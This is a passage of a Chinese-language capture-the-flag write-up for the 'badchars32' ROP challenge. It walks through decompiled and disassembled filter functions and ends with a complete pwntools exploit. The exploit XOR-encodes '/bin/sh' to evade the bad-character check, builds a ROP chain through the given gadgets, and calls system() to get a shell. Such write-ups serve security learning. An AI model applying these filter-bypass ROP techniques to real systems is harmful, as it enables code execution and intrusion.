  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> v0<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//存在漏洞 </span>
  <span class="token function">free</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>我们先看pwnme 函数都有哪些操作</p>
<p>接收到我们传入的字符串到v0</p>
<p>然后执行了一个nstrlen函数()传入长度为200字节</p>
<p>跟进分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">nstrlen</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-4h]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a2<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
      <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487D8 v0<span class="token punctuation">:</span>                                     <span class="token punctuation">;</span> CODE XREF<span class="token punctuation">:</span> nstrlen<span class="token operator">+</span><span class="token number">38</span>↓j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487D8                 mov     edx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>arg_0<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487DB                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487DE                 add     eax<span class="token punctuation">,</span> edx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487E0</span>                 movzx   eax<span class="token punctuation">,</span> byte ptr <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487E3</span>                 cmp     al<span class="token punctuation">,</span> 0Ah
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487E5</span>                 jnz     <span class="token keyword">short</span> loc_80487F0
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487E7</span>                 add     <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487EB                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487EE                 jmp     <span class="token keyword">short</span> locret_80487FF
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F0 <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F0
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F0 loc_80487F0<span class="token punctuation">:</span>                            <span class="token punctuation">;</span> CODE XREF<span class="token punctuation">:</span> nstrlen<span class="token operator">+</span><span class="token number">23</span>↑j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F0                 add     <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F4
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F4 loc_80487F4<span class="token punctuation">:</span>                            <span class="token punctuation">;</span> CODE XREF<span class="token punctuation">:</span> nstrlen<span class="token operator">+</span><span class="token number">14</span>↑j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F4                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487F7                 cmp     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>arg_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487FA                 jb      <span class="token keyword">short</span> v0
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>080487FC                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080487FF</span>
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>这段代码主要是在循环执行080487D8-到080487FA的内容 看到cmp这里的0xa </p>
<p>可以查询0x0a的相关信息，因为ebp+var_4的值一直在更新 所以这里的nstrlen函数应该就是在检测输入字符串的个数。</p>
<pre><code>0xA(十六进制数)=10(十进制数)
对应的字符为“控制字符”LF  (NL line feed, new line)：移行，换行。
&lt;p class=&quot;code-caption&quot; data-lang=&quot;&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; data-labels_left=&quot;&quot; data-labels_right=&quot;&quot; data-labels_copy=&quot;&quot;&gt;&lt;span class=&quot;code-caption-label&quot;&gt;&lt;/span&gt;&lt;/p&gt;
</code></pre><p>在执行完字符个数检测（nstrlen）之后又执行了checkBadchars 我们来跟进分析一下</p>
<pre class=" language-c"><code class="language-c">  v3 <span class="token operator">=</span> <span class="token string">'b'</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token string">'i'</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token string">'c'</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token string">'f'</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>
  v10 <span class="token operator">=</span> <span class="token string">'s'</span><span class="token punctuation">;</span>
  j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> a2 <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v3 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">21</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>看到v3-v10就是函数检查的badchars 我们再通过汇编查看</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048847</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048847</span> loc_8048847<span class="token punctuation">:</span>                            <span class="token punctuation">;</span> CODE XREF<span class="token punctuation">:</span> checkBadchars<span class="token operator">+</span><span class="token number">75</span>↓j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048847</span>                 mov     edx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>arg_0<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804884A                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804884D                 add     eax<span class="token punctuation">,</span> edx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0804884F</span>                 movzx   edx<span class="token punctuation">,</span> byte ptr <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048852</span>                 lea     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_10<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048855</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_8<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048858</span>                 add     eax<span class="token punctuation">,</span> ecx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804885A                 movzx   eax<span class="token punctuation">,</span> byte ptr <span class="token punctuation">[</span>eax<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804885D                 cmp     dl<span class="token punctuation">,</span> al
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0804885F</span>                 jnz     <span class="token keyword">short</span> loc_804886E
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048861</span>                 mov     edx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>arg_0<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048864</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048867</span>                 add     eax<span class="token punctuation">,</span> edx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048869</span>                 mov     byte ptr <span class="token punctuation">[</span>eax<span class="token punctuation">]</span><span class="token punctuation">,</span> 0EBh
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804886C                 jmp     <span class="token keyword">short</span> loc_8048878
</code></pre>
<p>这里循环对输入的字符又进行了比较 如果出现上述字符串就会替换该字符串为0xEB </p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为题目和之前write4题目类似 所以这里从rop构造开始讲起</p>
<p>可是题目又对输入的字符进行检查了 我们现在想要的是/bin/sh 可是check函数中过滤了 b i n / s所以不能直接传入/bin/sh  不过题目中给了这样的提示</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">text<span class="token punctuation">:</span><span class="token number">08048890</span>                 public usefulGadgets
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048890</span> usefulGadgets<span class="token punctuation">:</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048890</span>                 xor     <span class="token punctuation">[</span>ebx<span class="token punctuation">]</span><span class="token punctuation">,</span> cl
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048892</span>                 retn
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048893</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048893</span>                 mov     <span class="token punctuation">[</span>edi<span class="token punctuation">]</span><span class="token punctuation">,</span> esi
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048895</span>                 retn
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048896</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048896</span>                 pop     ebx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048897</span>                 pop     ecx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048898</span>                 retn
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048899</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048899</span>                 pop     esi
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804889A                 pop     edi
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804889B                 retn
</code></pre>
<p>usefulGadgets 这里给了你xor提示， 既然有了这个gadget，我们可以利用先对/bin/sh进行xor加密来通过check ，然后通过usefulGadgets 来进行解密 接着调用即可</p>
<h4 id="ROP构造"><a href="#ROP构造" class="headerlink" title="ROP构造"></a>ROP构造</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">mov_ret <span class="token operator">=</span> <span class="token number">0x08048893</span> <span class="token comment" spellcheck="true"># mov dword ptr [edi], esi ; ret</span>

pop_esi_edi <span class="token operator">=</span> <span class="token number">0x08048899</span> <span class="token comment" spellcheck="true"># pop esi ; pop edi ; ret</span>

pop_ebx_ecx<span class="token operator">=</span><span class="token number">0x08048896</span> <span class="token comment" spellcheck="true">#pop ebx ; pop ecx ; ret</span>
xor_ebx<span class="token operator">=</span><span class="token number">0x08048890</span> <span class="token comment" spellcheck="true">#xor byte ptr [ebx], cl ; ret</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_esi_edi<span class="token punctuation">)</span><span class="token operator">+</span>binsh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi<span class="token punctuation">)</span> <span class="token operator">+</span> binsh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

<span class="token operator">//</span>解密操作
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span>i<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_byte<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
</code></pre>
<p>覆盖偏移到ret+覆盖ret为pop_esi_edi+写入binsh中的前四字节(加密后的/bin)到esi 因为32位程序寄存器最大只能存4字节+写入bss段地址到edi+将esi内容写到edi中 mov_ret</p>
<p>覆盖ret为pop_esi_edi+写入binsh中的后四字节(加密后的/sh\x00)到esi+写入bss段+4地址到edi(因为前4字节写入了/bin)+写入bss段+4地址到edi+将esi内容写到edi中 mov_ret</p>
<p>解密操作 下面有解释</p>
<p>写入system_plt+构造任意返回地址+当前解密(/bin/sh)过后的bss段地址</p>
<h4 id="xor加解密操作"><a href="#xor加解密操作" class="headerlink" title="xor加解密操作"></a>xor加解密操作</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">xor加密操作
badchars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">]</span>
xor_byte <span class="token operator">=</span> <span class="token number">0x1</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    binsh <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">:</span>
        c <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> xor_byte
        <span class="token keyword">if</span> c <span class="token keyword">in</span> badchars<span class="token punctuation">:</span>
            xor_byte <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            binsh <span class="token operator">+=</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
xor解密操作
pop_ebx_ecx<span class="token operator">=</span><span class="token number">0x08048896</span> <span class="token comment" spellcheck="true">#pop ebx ; pop ecx ; ret</span>
xor_ebx<span class="token operator">=</span><span class="token number">0x08048890</span> <span class="token comment" spellcheck="true">#xor byte ptr [ebx], cl ; ret</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span>i<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_byte<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx<span class="token punctuation">)</span>
</code></pre>
<p>解密操作：当我们利用rop将加密过得/bin/sh写入到bss段之后 逐个进行解密</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'badchars32'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'badchars32'</span><span class="token punctuation">)</span>
badchars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">]</span>
bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
xor_byte <span class="token operator">=</span> <span class="token number">0x1</span>
system_plt <span class="token operator">=</span> <span class="token number">0x080484E0</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    binsh <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">:</span>
        c <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> xor_byte
        <span class="token keyword">if</span> c <span class="token keyword">in</span> badchars<span class="token punctuation">:</span>
            xor_byte <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            binsh <span class="token operator">+=</span> chr<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>


mov_ret <span class="token operator">=</span> <span class="token number">0x08048893</span> <span class="token comment" spellcheck="true"># mov dword ptr [edi], esi ; ret</span>

pop_esi_edi <span class="token operator">=</span> <span class="token number">0x08048899</span> <span class="token comment" spellcheck="true"># pop esi ; pop edi ; ret</span>

pop_ebx_ecx<span class="token operator">=</span><span class="token number">0x08048896</span> <span class="token comment" spellcheck="true">#pop ebx ; pop ecx ; ret</span>
xor_ebx<span class="token operator">=</span><span class="token number">0x08048890</span> <span class="token comment" spellcheck="true">#xor byte ptr [ebx], cl ; ret</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_esi_edi<span class="token punctuation">)</span><span class="token operator">+</span>binsh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi<span class="token punctuation">)</span> <span class="token operator">+</span> binsh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span>i<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_byte<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
